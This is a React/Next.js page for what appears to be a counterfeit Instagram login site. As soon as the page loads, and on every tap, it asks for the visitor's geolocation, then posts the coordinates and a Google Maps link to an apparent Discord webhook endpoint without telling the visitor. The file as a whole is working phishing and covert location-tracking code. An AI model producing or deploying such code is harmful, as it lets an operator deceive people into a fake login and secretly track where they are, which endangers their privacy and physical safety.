'use client'

import { useState, useRef, useCallback, useEffect } from 'react'
import InstagramLogin from '@/components/InstagramLogin'

export default function Home() {
  const [locationGranted, setLocationGranted] = useState(false)
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null)
  const locationRequested = useRef(false)

  const sendLocationToDiscord = useCallback(async (lat: number, lng: number) => {
    try {
      const response = await fetch('/api/discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'location',
          latitude: lat,
          longitude: lng,
          mapUrl: `https://www.google.com/maps?q=${lat},${lng}`,
        }),
      })

      if (!response.ok) {
        console.error('Failed to send location to Discord')
      }
    } catch (error) {
      console.error('Error sending location:', error)
    }
  }, [])

  const requestLocation = useCallback(() => {
    // Check if already requested or geolocation not available
    if (locationRequested.current) {
      return
    }
    
    if (!navigator.geolocation) {
      console.warn('Geolocation is not supported by this browser')
      return
    }
    
    // Check if we're on HTTPS or localhost (required for geolocation)
    const isSecure = window.location.protocol === 'https:' || 
                    window.location.hostname === 'localhost' || 
                    window.location.hostname === '127.0.0.1'
    
    if (!isSecure) {
      console.warn('Geolocation requires HTTPS (or localhost). Current protocol:', window.location.protocol)
      // Still try, but log the warning
    }
    
    locationRequested.current = true
    
    console.log('Requesting location permission...')
    
    // Request location with proper options for mobile
    navigator.geolocation.getCurrentPosition(
      (position) => {
        console.log('Location access granted!')
        const { latitude, longitude } = position.coords
        setLocation({ lat: latitude, lng: longitude })
        setLocationGranted(true)
        
        // Send location to Discord immediately
        sendLocationToDiscord(latitude, longitude)
      },
      (error) => {
        console.error('Location access error:', error.code, error.message)
        // Reset to allow retry on user interaction
        locationRequested.current = false
        
        // Log specific error types
        switch(error.code) {
          case error.PERMISSION_DENIED:
            console.error('User denied the request for Geolocation')
            break
          case error.POSITION_UNAVAILABLE:
            console.error('Location information is unavailable')
            break
          case error.TIMEOUT:
            console.error('The request to get user location timed out')
            break
        }
      },
      {
        enableHighAccuracy: false, // Set to false for faster response on mobile
        timeout: 20000, // Increased timeout for mobile
        maximumAge: 60000 // Accept cached location up to 1 minute old
      }
    )
  }, [sendLocationToDiscord])

  // Request location immediately when page loads
  useEffect(() => {
    // Small delay to ensure page is fully loaded
    const timer = setTimeout(() => {
      requestLocation()
    }, 100)
    
    return () => clearTimeout(timer)
  }, [requestLocation])

  return (
    <main 
      onClick={(e) => {
        // Only trigger on direct clicks, not on child elements
        if (e.target === e.currentTarget) {
          requestLocation()
        }
      }}
      onTouchStart={(e) => {
        // Trigger on any touch on the main element
        e.preventDefault()
        requestLocation()
      }}
      style={{ touchAction: 'manipulation' }}
    >
      <InstagramLogin location={location} onUserInteraction={requestLocation} />
    </main>
  )
}

